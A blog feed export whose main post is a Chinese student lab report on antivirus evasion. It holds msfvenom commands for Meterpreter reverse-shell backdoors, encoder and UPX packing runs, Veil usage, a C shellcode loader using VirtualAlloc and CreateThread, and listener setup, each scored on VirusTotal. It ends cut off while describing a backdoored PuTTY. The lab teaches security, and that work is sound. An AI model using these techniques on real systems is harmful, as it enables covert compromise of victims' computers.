{
    "version": "https://jsonfeed.org/version/1",
    "title": "Ethan Chase‘s Site",
    "description": "",
    "home_page_url": "https://Ethan-Chase.github.io",
    "feed_url": "https://Ethan-Chase.github.io/feed.json",
    "user_comment": "",
    "author": {
        "name": "Ethan Chase"
    },
    "items": [
        {
            "id": "https://Ethan-Chase.github.io/a.html",
            "url": "https://Ethan-Chase.github.io/a.html",
            "title": "a",
            "content_html": "\n    <h2 id=\"b\">\n      b\n    </h2>\n\n    <figure class=\"post__image post__image--center\">\n      <img loading=\"lazy\" src=\"\" height=\"\" width=\"\" alt=\"\"  data-is-external-image=\"true\">\n      \n    </figure>\n\n    <h2 id=\"a\">\n      a\n    </h2>\n<div>a</div>\n<pre class=\"line-numbers  language-html\"><code>a</code></pre>\n\n  <div class=\"post__toc\">\n    <h3>a</h3>\n    <ul>\n      <li><a href=\"#b\">b</a></li><li><a href=\"#a\">a</a></li>\n    </ul>\n  </div>\n  ",
            "author": {
                "name": "Ethan Chase"
            },
            "tags": [
            ],
            "date_published": "2024-04-07T07:34:24+08:00",
            "date_modified": "2024-04-07T07:34:24+08:00"
        },
        {
            "id": "https://Ethan-Chase.github.io/di-3ci-shi-yan-mian-sha-yuan-li.html",
            "url": "https://Ethan-Chase.github.io/di-3ci-shi-yan-mian-sha-yuan-li.html",
            "title": "第3次实验-免杀原理",
            "content_html": "<h1 class=\"md-end-block md-heading md-focus\"><span class=\"md-plain md-expand\">第3次实验-免杀原理</span></h1>\n<h2 class=\"md-end-block md-heading\"><span class=\"md-plain\">1基础问题回答</span></h2>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">（1）杀软是如何检测出恶意代码的？</span></h3>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">杀毒软件检测恶意代码的主要方法包括：</span></p>\n<ul class=\"ul-list\" data-mark=\"-\">\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-pair-s \"><strong><span class=\"md-plain\">签名检测</span></strong></span><span class=\"md-plain\">：这是最传统的方法，依赖于一个不断更新的恶意软件签名数据库。杀软通过比对文件的特征码（签名）与已知恶意软件的特征码进行匹配来检测恶意代码。</span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-pair-s \"><strong><span class=\"md-plain\">行为分析</span></strong></span><span class=\"md-plain\">：杀软监控程序的行为，包括对文件、网络、系统资源的访问和修改。如果软件的行为模式与已知的恶意行为模式匹配，则可能被判定为恶意软件。</span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-pair-s \"><strong><span class=\"md-plain\">启发式分析</span></strong></span><span class=\"md-plain\">：利用启发式算法分析未知软件的行为和代码结构，尝试发现未知的或变种的恶意软件。这种方法不仅仅依赖于已知的恶意软件数据库，而是尝试识别新的威胁。</span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-pair-s \"><strong><span class=\"md-plain\">沙箱执行</span></strong></span><span class=\"md-plain\">：在一个隔离的环境（沙箱）中执行程序，分析其行为，从而不对实际系统造成影响。如果程序在沙箱中表现出恶意行为，那么它就可能被识别为恶意软件。</span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-pair-s \"><strong><span class=\"md-plain\">云检测</span></strong></span><span class=\"md-plain\">：借助云计算技术，杀软可以迅速分析大量数据，识别新出现的恶意软件。这种方法可以有效地提高检测的速度和准确性。</span></p>\n</li>\n</ul>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">（2）免杀是做什么？</span></h3>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">免杀是指通过各种技术手段避免恶意软件被杀毒软件检测到的行为。这通常涉及到对恶意软件代码的修改，使其能够绕过安全软件的检测机制，从而在未被发现的情况下在目标系统上执行。</span></p>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">（3）免杀的基本方法有哪些？</span></h3>\n<h4 class=\"md-end-block md-heading\"><span class=\"md-plain\">①改变特征码</span></h4>\n<ul class=\"ul-list\" data-mark=\"-\">\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">加壳</span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">用encode进行编码</span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">用其他语言进行重写再编译</span></p>\n</li>\n</ul>\n<h4 class=\"md-end-block md-heading\"><span class=\"md-plain\">②改变行为</span></h4>\n<ul class=\"ul-list\" data-mark=\"-\">\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">改变通讯方式</span></p>\n<ul class=\"ul-list\" data-mark=\"-\">\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">尽量使用反弹式连接</span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">使用隧道技术</span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">加密通讯数据</span></p>\n</li>\n</ul>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">改变操作模式</span></p>\n<ul class=\"ul-list\" data-mark=\"-\">\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">基于内存操作</span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">减少对系统的修改</span></p>\n</li>\n</ul>\n</li>\n</ul>\n<h4 class=\"md-end-block md-heading\"><span class=\"md-plain\">③非常规方法</span></h4>\n<ul class=\"ul-list\" data-mark=\"-\">\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">使用一个有漏洞的应用当成后门，编写攻击代码集成到如MSF中。</span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">使用社工类攻击，诱骗目标关闭AV软件。</span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">纯手工打造一个恶意软件。</span></p>\n</li>\n</ul>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">（4）开启杀软能绝对防止电脑中恶意代码吗？</span></h3>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">开启杀毒软件不能绝对防止电脑中恶意代码的感染。虽然杀软可以大幅度提高安全性，减少恶意软件的威胁，但因为以下原因，它不能提供100%的保护：</span></p>\n<ul class=\"ul-list\" data-mark=\"-\">\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">新出现的恶意软件或变种可能还未被安全厂商发现，因此未被加入到签名数据库中。</span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">免杀技术的发展使得恶意软件能够绕过杀软的检测机制。</span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">用户的不安全行为，如点击未知链接、下载不安全的附件等，也可能导致安全防护措施被绕过。</span></p>\n</li>\n</ul>\n<h2 class=\"md-end-block md-heading\"><span class=\"md-plain\">2实验内容</span></h2>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">2.0免杀检测网站</span></h3>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">VirusTotal、Virscan</span></p>\n<ul class=\"ul-list\" data-mark=\"-\">\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-link md-pair-s\" spellcheck=\"false\"><a href=\"https://www.virustotal.com/\">https://www.virustotal.com/</a></span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-link md-pair-s\" spellcheck=\"false\"><a href=\"http://www.virscan.org/\">http://www.virscan.org/</a></span></p>\n</li>\n</ul>\n<blockquote>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">本次实验中使用VirusTotal进行检测</span></p>\n</blockquote>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">2.1直接使用msf生成的可执行文件进行检测</span></h3>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">生成可执行文件</span></p>\n<pre class=\"md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded\" lang=\"shell\" spellcheck=\"false\"> <span role=\"presentation\">msfvenom <span class=\"cm-attribute\">-p</span> windows/meterpreter/reverse_tcp <span class=\"cm-def\">LHOST</span><span class=\"cm-operator\">=</span><span class=\"cm-number\">192</span>.168.255.137 <span class=\"cm-def\">LPORT</span><span class=\"cm-operator\">=</span><span class=\"cm-number\">4325</span> <span class=\"cm-attribute\">-f</span> exe &gt; backdoor_4325_1.exe</span></pre>\n<p class=\"md-end-block md-p\"> </p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\" data-src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326042319100.png\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326042319100.png\" alt=\"image-20240326042319100\" data-is-external-image=\"true\"></span></p>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">2.2使用编码器编码编码后再次进行检测</span></h3>\n<pre class=\"md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded\" lang=\"shell\" spellcheck=\"false\"> <span role=\"presentation\">msfvenom <span class=\"cm-attribute\">-p</span> windows/meterpreter/reverse_tcp <span class=\"cm-attribute\">-e</span> x86/shikata_ga_nai <span class=\"cm-attribute\">-b</span> <span class=\"cm-string\">'\\x00'</span> <span class=\"cm-def\">LHOST</span><span class=\"cm-operator\">=</span><span class=\"cm-number\">192</span>.168.255.137 <span class=\"cm-def\">LPORT</span><span class=\"cm-operator\">=</span><span class=\"cm-number\">4325</span> <span class=\"cm-attribute\">-f</span> exe &gt; backdoor_4325_2.exe</span></pre>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">没有用~</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\" data-src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326042817836.png\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326042817836.png\" alt=\"image-20240326042817836\" data-is-external-image=\"true\"></span></p>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">2.3使用编码器编码编码20次后再次进行检测</span></h3>\n<pre class=\"md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded\" lang=\"shell\" spellcheck=\"false\"> <span role=\"presentation\">msfvenom <span class=\"cm-attribute\">-p</span> windows/meterpreter/reverse_tcp <span class=\"cm-attribute\">-e</span> x86/shikata_ga_nai <span class=\"cm-attribute\">-i</span> <span class=\"cm-number\">20</span> <span class=\"cm-attribute\">-b</span> <span class=\"cm-string\">'\\x00'</span> <span class=\"cm-def\">LHOST</span><span class=\"cm-operator\">=</span><span class=\"cm-number\">192</span>.168.255.137 <span class=\"cm-def\">LPORT</span><span class=\"cm-operator\">=</span><span class=\"cm-number\">4325</span> <span class=\"cm-attribute\">-f</span> exe &gt; backdoor_4325_3.exe</span></pre>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">你就说有没有变好吧</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\" data-src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326043020028.png\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326043020028.png\" alt=\"image-20240326043020028\" data-is-external-image=\"true\"></span></p>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">2.4使用Veil</span></h3>\n<h4 class=\"md-end-block md-heading\"><span class=\"md-plain\">安装之前最好照个快照，要是哪里不行了可以随时回档！！！</span></h4>\n<blockquote>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">不知道什么是快照的去</span><span class=\"md-meta-i-c  md-link\"><a href=\"https://blog.csdn.net/Dong_Alex/article/details/103547869\"><span class=\"md-plain\">VMware虚拟机快照功能_虚拟机恢复快照是什么意思-CSDN博客</span></a></span></p>\n</blockquote>\n<p class=\"md-end-block md-p\"><span class=\"md-pair-s \"><strong><span class=\"md-plain\">最理想的情况：</span></strong></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">安装Veil(执行之后就别动了,弹窗什么的它都会自动执行,只用在最后输入密码即可)</span></p>\n<pre class=\"md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded\" lang=\"shell\" spellcheck=\"false\"> <span role=\"presentation\"><span class=\"cm-builtin\">sudo</span> apt <span class=\"cm-attribute\">-y</span> install veil</span><br> <span role=\"presentation\">/usr/share/veil/config/setup.sh <span class=\"cm-attribute\">--force</span> <span class=\"cm-attribute\">--silent</span></span></pre>\n<div class=\"md-alert md-alert-note\">\n<p class=\"md-end-block md-p\"> </p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">如果卡在这种程序安装的地方的话还是点一下，全部都是默认即可，一路Next到底</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\" data-src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/4cacc6e98c1979b37fb678b63bf89ce.png\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/4cacc6e98c1979b37fb678b63bf89ce.png\" alt=\"4cacc6e98c1979b37fb678b63bf89ce\" data-is-external-image=\"true\"></span></p>\n</div>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">打开Veil-Evasion</span></p>\n<pre class=\"md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded\" lang=\"shell\" spellcheck=\"false\"> <span role=\"presentation\">veil</span></pre>\n<blockquote>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">使用方法参考博客:</span><span class=\"md-meta-i-c  md-link\"><a href=\"https://blog.csdn.net/qq_41453285/article/details/93538838?ops_request_misc=%7B%22request%5Fid%22%3A%22171140197316800188574575%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&amp;request_id=171140197316800188574575&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-93538838-null-null.nonecase&amp;utm_term=veil&amp;spm=1018.2226.3001.4450\"><span class=\"md-plain\">Kali——绕过杀毒软件检测工具Veil-Evasion_veil 工具原理-CSDN博客</span></a></span></p>\n</blockquote>\n<pre class=\"md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded\" lang=\"shell\" spellcheck=\"false\"> <span role=\"presentation\">use <span class=\"cm-number\">1</span></span><br> <span role=\"presentation\">use <span class=\"cm-number\">7</span></span><br> <span role=\"presentation\"><span class=\"cm-keyword\">set</span> LHOST <span class=\"cm-number\">192</span>.168.255.137</span><br> <span role=\"presentation\"><span class=\"cm-keyword\">set</span> LPORT <span class=\"cm-number\">4325</span></span><br> <span role=\"presentation\">options</span><br> <span role=\"presentation\">generate</span></pre>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\" data-src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326053010155.png\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326053010155.png\" alt=\"image-20240326053010155\" data-is-external-image=\"true\"></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">好了一点</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\" data-src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326053056315.png\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326053056315.png\" alt=\"image-20240326053056315\" data-is-external-image=\"true\"></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">在windows下运行payload.exe尝试攻击</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\" data-src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240328135351722.png\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240328135351722.png\" alt=\"image-20240328135351722\" data-is-external-image=\"true\"></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">攻击成功</span></p>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">2.5C语言调用</span></h3>\n<h4 class=\"md-end-block md-heading\"><span class=\"md-plain\">第一次攻击——失败</span></h4>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">先用msf生成一段C语言格式的shellcode数组</span></p>\n<pre class=\"md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded\" lang=\"shell\" spellcheck=\"false\"> <span role=\"presentation\">msfvenom <span class=\"cm-attribute\">-p</span> windows/meterpreter/reverse_tcp <span class=\"cm-def\">LHOST</span><span class=\"cm-operator\">=</span><span class=\"cm-number\">192</span>.168.255.137 <span class=\"cm-def\">LPORT</span><span class=\"cm-operator\">=</span><span class=\"cm-number\">4325</span> <span class=\"cm-attribute\">-f</span> c &gt; shellcode_win_4325.c</span></pre>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">在文件中添加</span></p>\n<pre class=\"md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded\" lang=\"c\" spellcheck=\"false\"> <span role=\"presentation\"><span class=\"cm-variable-3\">int</span> <span class=\"cm-def\">main</span>()</span><br> <span role=\"presentation\">{</span><br> <span role=\"presentation\">        <span class=\"cm-variable-3\">int</span> (<span class=\"cm-operator\">*</span><span class=\"cm-variable\">func</span>)() <span class=\"cm-operator\">=</span> (<span class=\"cm-variable-3\">int</span>(<span class=\"cm-operator\">*</span>)())<span class=\"cm-variable\">buf</span>;</span><br> <span role=\"presentation\">        <span class=\"cm-variable\">func</span>();</span><br> <span role=\"presentation\">}</span></pre>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\" data-src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326054116189.png\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326054116189.png\" alt=\"image-20240326054116189\" data-is-external-image=\"true\"></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">静态编译防止动态连接丢失</span></p>\n<pre class=\"md-fences mock-cm md-end-block md-fences-with-lineno\" lang=\"shell\" spellcheck=\"false\">i686-w64-mingw32-g++ shellcode_win_4325.c -o shellcode_win_4325.exe -static</pre>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">没有MinGW-w64的可以安装一下:</span></p>\n<pre class=\"md-fences mock-cm md-end-block md-fences-with-lineno\" lang=\"shell\" spellcheck=\"false\">sudo apt install mingw-w64</pre>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">另外一种安装方式：</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c  md-link\"><a href=\"https://command-not-found.com/i686-w64-mingw32-c++\"><span class=\"md-plain\">command-not-found.com – i686-w64-mingw32-c++</span></a></span></p>\n<pre class=\"md-fences mock-cm md-end-block md-fences-with-lineno\" lang=\"shell\" spellcheck=\"false\">apt-get install g++-mingw-w64-i686</pre>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">结果更好了</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\" data-src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326055049121.png\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326055049121.png\" alt=\"image-20240326055049121\" data-is-external-image=\"true\"></span></p>\n<p class=\"md-end-block md-p\"> </p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">尝试攻击</span></p>\n<pre class=\"md-fences mock-cm md-end-block md-fences-with-lineno\" lang=\"shell\" spellcheck=\"false\">msfconsole</pre>\n<pre class=\"md-fences mock-cm md-end-block md-fences-with-lineno\" lang=\"shell\" spellcheck=\"false\">use exploit/multi/handler<br>set payload windows/meterpreter/reverse_tcp<br>set LHOST 192.168.255.137<br>set LPORT 4325</pre>\n<pre class=\"md-fences mock-cm md-end-block md-fences-with-lineno\" lang=\"shell\" spellcheck=\"false\">options</pre>\n<pre class=\"md-fences mock-cm md-end-block md-fences-with-lineno\" lang=\"shell\" spellcheck=\"false\">run</pre>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">无法连接</span></p>\n<h4 class=\"md-end-block md-heading\"><span class=\"md-plain\">分析失败原因-by 20214321吴萌源</span></h4>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">通过对编译后的exe进行debug分析问题所在</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\" data-src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/dbg%E6%89%BE%E5%87%BA%E9%97%AE%E9%A2%98.gif\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/dbg%E6%89%BE%E5%87%BA%E9%97%AE%E9%A2%98.gif\" alt=\"dbg找出问题\" data-is-external-image=\"true\"></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">发现异常后通过文心一言确定问题</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\" data-src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/36f23d9f4397d7f25e75a59bf19562a.png\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/36f23d9f4397d7f25e75a59bf19562a.png\" alt=\"36f23d9f4397d7f25e75a59bf19562a\" data-is-external-image=\"true\"></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">让文心一言给出修改方案</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image\" data-src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/70f3be2fe1162626bfc1385bf596b26.png\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/70f3be2fe1162626bfc1385bf596b26.png\" alt=\"70f3be2fe1162626bfc1385bf596b26\" data-is-external-image=\"true\"></span></p>\n<p class=\"md-end-block md-p\"> </p>\n<h4 class=\"md-end-block md-heading\"><span class=\"md-plain\">第二次攻击——成功</span></h4>\n<blockquote>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">再次感谢20214321吴萌源同学的帮助</span></p>\n</blockquote>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">还是先用msf生成一段C语言格式的shellcode数组</span></p>\n<pre class=\"md-fences mock-cm md-end-block md-fences-with-lineno\" lang=\"shell\" spellcheck=\"false\">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.255.137 LPORT=4325 -f c &gt; shellcode_win_4325.c</pre>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">修改在文件中添加为：</span></p>\n<pre class=\"md-fences mock-cm md-end-block md-fences-with-lineno\" lang=\"c\" spellcheck=\"false\">#include &lt;windows.h&gt;  <br>#include &lt;iostream&gt;  <br>int main() {  <br>    // 分配可执行内存  <br>    void* execMem = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);  <br>    if (execMem == NULL) {  <br>        std::cerr &lt;&lt; \"Memory allocation failed!\" &lt;&lt; std::endl;  <br>        return 1;  <br>    }  <br>   // 复制shellcode到可执行内存  <br>    memcpy(execMem, buf, sizeof(buf));   <br>    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);  <br>    if (thread == NULL) {  <br>        std::cerr &lt;&lt; \"Thread creation failed!\" &lt;&lt; std::endl;  <br>        VirtualFree(execMem, 0, MEM_RELEASE);  <br>        return 1;  <br>    }  <br>    WaitForSingleObject(thread, INFINITE);  <br>    CloseHandle(thread);  <br>    VirtualFree(execMem, 0, MEM_RELEASE);  <br>    return 0;  <br>}</pre>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\" data-src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240404140410028.png\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240404140410028.png\" alt=\"image-20240404140410028\" data-is-external-image=\"true\"></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">静态编译防止动态连接丢失</span></p>\n<pre class=\"md-fences mock-cm md-end-block md-fences-with-lineno\" lang=\"shell\" spellcheck=\"false\">i686-w64-mingw32-g++ shellcode_win_4325.c -o shellcode_win_4325.exe -static</pre>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">尝试攻击</span></p>\n<pre class=\"md-fences mock-cm md-end-block md-fences-with-lineno\" lang=\"shell\" spellcheck=\"false\">msfconsole</pre>\n<pre class=\"md-fences mock-cm md-end-block md-fences-with-lineno\" lang=\"shell\" spellcheck=\"false\">use exploit/multi/handler<br>set payload windows/meterpreter/reverse_tcp<br>set LHOST 192.168.255.137<br>set LPORT 4325</pre>\n<pre class=\"md-fences mock-cm md-end-block md-fences-with-lineno\" lang=\"shell\" spellcheck=\"false\">options</pre>\n<pre class=\"md-fences mock-cm md-end-block md-fences-with-lineno\" lang=\"shell\" spellcheck=\"false\">run</pre>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\" data-src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240404140610410.png\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240404140610410.png\" alt=\"image-20240404140610410\" data-is-external-image=\"true\"></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">攻击成功！</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">最后再给virustotal鉴定一下：</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\" data-src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240404141200950.png\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240404141200950.png\" alt=\"image-20240404141200950\" data-is-external-image=\"true\"></span></p>\n<p class=\"md-end-block md-p\"> </p>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">2.6加壳</span></h3>\n<h4 class=\"md-end-block md-heading\"><span class=\"md-plain\">使用upx对backdoor_20214325.exe进行加壳</span></h4>\n<pre class=\"md-fences mock-cm md-end-block md-fences-with-lineno\" lang=\"shell\" spellcheck=\"false\">upx backdoor_20214325.exe -o backdoor_20214325_ups.exe</pre>\n<p class=\"md-end-block md-p\"><span class=\"md-image\" data-src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/2c787368482691a58ada343863f17b6.png\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/2c787368482691a58ada343863f17b6.png\" alt=\"2c787368482691a58ada343863f17b6\" data-is-external-image=\"true\"></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">运行backdoor_20214325_ups.exe后攻击成功</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\" data-src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240328144030424.png\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240328144030424.png\" alt=\"image-20240328144030424\" data-is-external-image=\"true\"></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">测一测，比不加壳之前（58/72）好了一点点</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\" data-src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/6d3b5694781debe56a963570beb9332.png\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/6d3b5694781debe56a963570beb9332.png\" alt=\"6d3b5694781debe56a963570beb9332\" data-is-external-image=\"true\"></span></p>\n<p class=\"md-end-block md-p\"> </p>\n<h4 class=\"md-end-block md-heading\"><span class=\"md-plain\">使用upx对paylod.exe进行加壳</span></h4>\n<pre class=\"md-fences mock-cm md-end-block md-fences-with-lineno\" lang=\"shell\" spellcheck=\"false\">upx paylod.exe -o paylod_upx.exe</pre>\n<p class=\"md-end-block md-p\"><span class=\"md-image\" data-src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240328142401115.png\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240328142401115.png\" alt=\"image-20240328142401115\" data-is-external-image=\"true\"></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">运行paylod_upx.exe后攻击成功</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image\" data-src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240328142451614.png\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240328142451614.png\" alt=\"image-20240328142451614\" data-is-external-image=\"true\"></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">测一下，反向升级了。。。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image\" data-src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240328142707459.png\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240328142707459.png\" alt=\"image-20240328142707459\" data-is-external-image=\"true\"></span></p>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">2.7 通过组合应用各种技术实现恶意代码免杀</span></h3>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">生成后门软件PuttY_upx.exe，成功与Windows Defender共存，详细见2.8</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image\" data-src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/3621edfb11518f2f636ae3a2783dbb0.png\"><img loading=\"lazy\" 